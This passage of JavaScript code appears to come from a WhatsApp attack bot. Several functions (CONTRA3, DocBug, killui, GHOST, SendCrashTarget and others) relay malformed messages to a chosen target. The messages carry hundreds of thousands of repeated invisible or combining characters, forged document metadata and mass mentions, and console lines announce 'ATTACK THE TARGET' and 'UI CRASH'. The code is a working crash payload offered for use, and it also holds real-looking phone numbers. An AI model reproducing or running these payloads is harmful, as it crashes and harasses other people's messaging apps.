"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "HKC-QI-0",
"screen_0_Dropdown_1": "HK-9999",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "SCT-COMPANY@GLITCH.com",
"screen_1_TextInput_4": "https://www.google.com/",
"screen_1_TextInput_5": "https://api.whatsapp.com/send?phone=+🪭&text="+"@0".repeat(90000),       
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "${" \u0003".repeat(55000)}",
"screen_0_TextInput_1": "HK-3001",
"screen_0_TextInput_2": "HK-6666",
"screen_0_TextInput_3": "HK-3004",
"screen_4_TextInput_8": "0x80048820",
"screen_0_TextInput_4": "HK-3005",
"screen_0_TextInput_5": "HK-3000",
"screen_0_TextInput_6": "HK-3002",
"screen_0_TextInput_7": "HK-3005",
"screen_0_TextInput_8": "HK-3006",
"screen_0_TextInput_9": "HK-3008",
"screen_0_TextInput_10": "HK-1001",
"screen_1_TextInput_0": "HK-2002",
"screen_2_TextInput_0": "HK-5005",
"screen_3_TextInput_0": "HK-3003",
"screen_5_TextInput_0": "Doomsday-2024",
"screen_0_Dropdown_2": "0.0.9_#AmpasWKWK",
"screen_0_Dropdown_3": "HK-0001",
"screen_0_Dropdown_4": "Doomsday-2024",
"screen_3_EmojiBombCrash_004": "🪭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(10000),
"flow_token": "AAAAAA_TOKEN_SECRET_CONTRA_SecretCompany_Lakuning_Mati.BANGKITKembali"
}`,
                version: 3
            }
        }
    },
  messageVersion: 1,
},
},
},
},
  Ptcp ? {
    participant: {
     jid: target
    }
   } : {}
  );
}
console.log(chalk.red("🪭𝙹 𝙸 ♕ 𝙽 𝚂 || 𝙰𝚃𝚃𝙰𝙲𝙺 𝚃𝙷𝙴 𝚃𝙰𝚁𝙶𝙴𝚃 || 𝙲 𝙾 𝙽 ♕ 𝚃 𝚁 𝙰 2"));
}
async function CONTRA3(target, Ptcp = true) {
  const mampos = "⍣⍣⍣".repeat(53500);
await cella.relayMessage(target, {
ephemeralMessage:{
  groupMentionedMessage:{
message:{
  InteractiveMessage:{
  contactsArrayMessage: {
    displayName: "⎝⎝⎝🪭𝚂𝙴𝙲𝚁𝙴𝚃♕𝙲𝙾𝙼𝙿𝙰𝙽𝚈-𝙻𝚃𝙳🪭⎞⎞⎞" + "ꦾ".repeat(30000),
    contacts: [
  {
    displayName: "+2348146895993",
    vcard: "BEGIN:VCARD\nVERSION:3.0\nN:+2348146895993\nFN:+2348146895993\nitem1.TEL;waid=2348146895993:2348146895993\nitem1.X-ABLabel:\"\u0003\".repeat(124000)\nitem2.EMAIL;type=INTERNET:\"⎝⎝⎝🪭𝚂𝙴𝙲𝚁𝙴𝚃♕𝙲𝙾𝙼𝙿𝙰𝙽𝚈-𝙻𝚃𝙳🪭⎞⎞⎞\" + \"\u0003\".repeat(110000)\nitem2.X-ABLabel:YouTube\nitem3.URL:\"⎝⎝⎝🪭𝚂𝙴𝙲𝚁𝙴𝚃♕𝙲𝙾𝙼𝙿𝙰𝙽𝚈-𝙻𝚃𝙳🪭⎞⎞⎞\" + \"꧀\".repeat(11000)\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;\n\n\n\n\n\n\n\n\n\n𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𒁂\ntarget = viewOnceMessage: {\n          message: {\n            liveLocationMessage: {\n            degreesLatitude: \"🪭𝚂 𝙰 𝙺 𝚁 𝙰 𝙻 𝙸𝚅🪭乂777\",\n            degreesLongitude: \"🪭𝚂 𝙰 𝙺 𝚁 𝙰 𝙻 𝙸𝚅🪭乂777\",\n            caption: `🪭𝚂 𝙰 𝙺 𝚁 𝙰 𝙻 𝙸𝚅🪭乂777꧅ꦲꦤꦏꦶꦢꦸꦁꦫꦸꦩꦼꦏ꧀ꦱꦲꦶꦁꦮꦼꦔꦶ꧈ꦠꦼꦒꦸꦃꦲꦪꦸꦭꦸꦥꦸꦠ꧀ꦠꦲꦶꦁꦭꦫ꧈ꦭꦸꦥꦸꦠ꧀ꦠꦧꦶꦭꦲꦶꦏꦧꦺꦃ꧈ꦗꦶꦩ꧀ꦱꦺꦠꦤ꧀ꦢꦠꦤ꧀ꦥꦸꦫꦸꦤ꧀ꦥꦤꦼꦭꦸꦃꦲꦤ꧀ꦠꦤ꧀ꦤꦤꦮꦤꦶ꧈ꦩꦶꦮꦃꦥꦁꦒꦮꦺꦲꦭ꧈ꦒꦸꦤꦤꦺꦮꦺꦴꦁꦭꦸꦥꦸꦠ꧀ꦒꦼꦤꦶꦲꦠꦼꦩꦃꦲꦤ꧀ꦠꦶꦂꦠ꧈ꦩꦭꦶꦁꦲꦢꦺꦴꦃꦠꦤ꧀ꦮꦤꦶꦥꦼꦫꦏ꧀ꦲꦶꦁꦏꦩꦶ꧈ꦏꦼꦩꦠ꧀ꦢꦸꦢꦸꦏ꧀ꦥꦤ꧀ꦱꦶꦂꦤ꧉`,\n            sequenceNumber: \"0\",\nitem4.X-ABLabel:𝙹𝙴𝙽𝙴𝙽𝙶𝙰𝙽 𝙼𝙰𝚃𝙸\nEND:VCARD"
  },
  {
    displayName: "+60 17-748 0773",
    vcard: "BEGIN:VCARD\nVERSION:3.0\nN:+2348146895993\nFN:+2348146895993\nitem1.TEL;waid=2348146895993:2348146895993\nitem1.X-ABLabel:\"\u0003\".repeat(124000)\nitem2.EMAIL;type=INTERNET:\"⎝⎝⎝🪭𝚂𝙴𝙲𝚁𝙴𝚃♕𝙲𝙾𝙼𝙿𝙰𝙽𝚈-𝙻𝚃𝙳🪭⎞⎞⎞\" + \" \".repeat(350000)\nitem2.X-ABLabel:YouTube\nitem3.URL:\"⎝⎝⎝🪭𝚂𝙴𝙲𝚁𝙴𝚃♕𝙲𝙾𝙼𝙿𝙰𝙽𝚈-𝙻𝚃𝙳🪭⎞⎞⎞\" + \"ꦾ\".repeat(30000)\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𒁂viewOnceMessage: {\n          message: {\n            liveLocationMessage: {\n            degreesLatitude: \"🪭𝚂 𝙰 𝙺 𝚁 𝙰 𝙻 𝙸𝚅🪭乂777\",\n            degreesLongitude: \"🪭𝚂 𝙰 𝙺 𝚁 𝙰 𝙻 𝙸𝚅🪭乂777\",\n            caption: `🪭𝚂 𝙰 𝙺 𝚁 𝙰 𝙻 𝙸𝚅🪭乂777꧅ꦲꦤꦏꦶꦢꦸꦁꦫꦸꦩꦼꦏ꧀ꦱꦲꦶꦁꦮꦼꦔꦶ꧈ꦠꦼꦒꦸꦃꦲꦪꦸꦭꦸꦥꦸꦠ꧀ꦠꦲꦶꦁꦭꦫ꧈ꦭꦸꦥꦸꦠ꧀ꦠꦧꦶꦭꦲꦶꦏꦧꦺꦃ꧈ꦗꦶꦩ꧀ꦱꦺꦠꦤ꧀ꦢꦠꦤ꧀ꦥꦸꦫꦸꦤ꧀ꦥꦤꦼꦭꦸꦃꦲꦤ꧀ꦠꦤ꧀ꦤꦤꦮꦤꦶ꧈ꦩꦶꦮꦃꦥꦁꦒꦮꦺꦲꦭ꧈ꦒꦸꦤꦤꦺꦮꦺꦴꦁꦭꦸꦥꦸꦠ꧀ꦒꦼꦤꦶꦲꦠꦼꦩꦃꦲꦤ꧀ꦠꦶꦂꦠ꧈ꦩꦭꦶꦁꦲꦢꦺꦴꦃꦠꦤ꧀ꦮꦤꦶꦥꦼꦫꦏ꧀ꦲꦶꦁꦏꦩꦶ꧈ꦏꦼꦩꦠ꧀ꦢꦸꦢꦸꦏ꧀ꦥꦤ꧀ꦱꦶꦂꦤ꧉`,\n            sequenceNumber: \"0\",\nitem4.X-ABLabel:𝙹𝙴𝙽𝙴𝙽𝙶𝙰𝙽 𝙼𝙰𝚃𝙸\nEND:VCARD"
  },
],
contextInfo: {
  mentionedJid: [
    "0@s.whatsapp.net"
         ],
        },
       },
       nativeFlowMessage:{},
       quotedMessage: {},
          messageVersion: 1,
        },
      },
    },
  },
}, Ptcp ? {
  participant: {
   jid: target
  }
 } : {}
);
console.log(chalk.red("🪭𝙹 𝙸 ♕ 𝙽 𝚂 || 𝙰𝚃𝚃𝙰𝙲𝙺 𝚃𝙷𝙴 𝚃𝙰𝚁𝙶𝙴𝚃 || 𝙲 𝙾 𝙽 ♕ 𝚃 𝚁 𝙰 - 𝟹"));
}
async function func1(target) {
    await cella.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝘾𝙍𝘼𝙎𝙃𝙐𝙄" + "ꦹꦹꦹ".repeat(400000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝘾𝙍𝘼𝙎𝙃𝙐𝙄" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function DocBug(target) {
 let virtex = "𝐅𝐀𝐌𝐙𝐘 🖤😈 𝐅𝐚𝐦𝐳𝐲𝐋𝐞𝐞";
   cella.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𝐅𝐀𝐌𝐙𝐘 🖤😈 𝐅𝐚𝐦𝐳𝐲𝐋𝐞𝐞" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Dikizz" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };      
async function killui(target, Ptcp = true) {
      await cella.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: 'https://i.ibb.co/BHyPGJds/shaban-md.jpg',
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⿻\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["2348146895993@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
console.log(chalk.red("🪭𝙵𝙰𝙼𝚉𝚈 ♕ 𝚃𝚁𝚄𝙽𝚂 || 𝚄𝙸 𝙲𝚁𝙰𝚂𝙷 𝙷𝙰𝚁𝙳|| 𝙽𝙾 𝙲𝙾𝚄𝙽𝚃𝙴𝚁"));
    }
async function GHOST(target) {
  await cella.relayMessage(target, {
  extendedTextMessage: {
      text: "⎝⎝⎝Famzy♕𝙲𝙾𝙼𝙿𝙰𝙽𝚈𝙻𝚃𝙳⎞⎞⎞" + "ꦽꦾ".repeat(90000) + "*ꦽꦾ*~".repeat(90000),
contextInfo: {
      mentionedJid: ["0@s.whatsapp.net", ...Array.from({
        length: 7000
       }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
    externalAdReply: {
      showAdAttribution: true,
      containsAutoReply: true,
      mediaType: 1,
      mediaUrl: '',
      renderLargerThumbnail: true,
      showAdAttribution: true,
      sourceUrl: 'https://secretcompany.com ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉  ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ҉ ' + "\uD800\uDFFF".repeat(13000),
thumbnailUrl: 'https://i.ibb.co/BHyPGJds/shaban-md.jpg',
      title: '𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭🪭𝚃𝚁𝙸𝙿𝙻𝙴-𝚂𝚇𝚂🪭' + "\u0003".repeat(20000),
body: '🪭𝙹 𝙸 ♕ 𝙽 𝚂🪭' + '\u0003'.repeat(130000),
      footer: "🪭𝙹 𝙸 ♕ 𝙽 𝚂",
  },
  mentionedJid: '17777@s.whatsapp.me',
  businessMessageForwardInfo: {
  businessOwnerJid: '2348146895993',
  },
  forwardedNewsletterMessageInfo: {
    newsletterJid: "120363209022250445@newsletter",
    serverMessageId: -1,
    newsletterName: "⚪️🔴⚫️"
  },
  interactiveMessage: {
    messageParamsJson: {},
    nativeFlowMessage: {},
  },
  quotedMessage: {
    callLogMesssage: {
      isVideo: true,
      callOutcome: "SILENCED_BY_DND",
      durationSecs: "0",
      callType: "REGULAR",
      participants: [{
        jid: target,
        callOutcome: "SILENCED_BY_DND"
      }]
    },
    },
  },
},
}, {
participant: {
jid: target
}
});
}


async function SendCrashTarget(target, Ptcp = false) {
      const spamContent = "_*~@Zephyrine~*_\n".repeat(10200);
      const crashContent = "ꦽ".repeat(1500);
      await cella.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "Devor6core",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
